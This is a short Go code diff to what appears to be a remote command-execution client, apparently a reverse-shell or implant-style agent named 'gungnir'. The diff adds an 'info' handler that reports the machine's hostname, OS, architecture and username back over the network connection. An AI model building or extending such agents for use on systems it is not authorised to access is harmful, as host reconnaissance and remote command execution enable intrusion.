@@ -13,6 +13,7 @@ import (
     "net"
     "os"
     "os/exec"
+    "os/user"
     "path/filepath"
     "runtime"
     "strings"
@@ -23,6 +24,9 @@ import (
     u "gungnir/internal/utils"
     s "gungnir/internal/secure"
 )
+
+var BuildID string
+var _ = BuildID
 
 const blackhole = "If you feel you are in a black hole, don’t give up. There’s a way out."
 
@@ -180,6 +184,8 @@ func runSession(id string, conn net.Conn) error {
             go c.handleCmd(&msg)
         case "ping":
             c.send <- &p.Message{ID: msg.ID, Type: "pong"}
+        case "info":
+            go c.handleInfo(&msg)
         default:
             log.Printf("unknown msg type: %s", msg.Type)
         }
@@ -242,6 +248,21 @@ func (c *Client) handleCmd(msg *p.Message) {
         Output:   out,
         ExitCode: code,
         Error:    errString(err),
+    }
+
+    c.send <- reply
+}
+
+func (c *Client) handleInfo(msg *p.Message) {
+    h, _ := os.Hostname()
+    u, _ := user.Current()
+    reply := &p.Message{
+        ID:       msg.ID,
+        Type:     "info_result",
+        Hostname: h,
+        OS:       runtime.GOOS,
+        Arch:     runtime.GOARCH,
+        Username: u.Username,
     }
 
     c.send <- reply
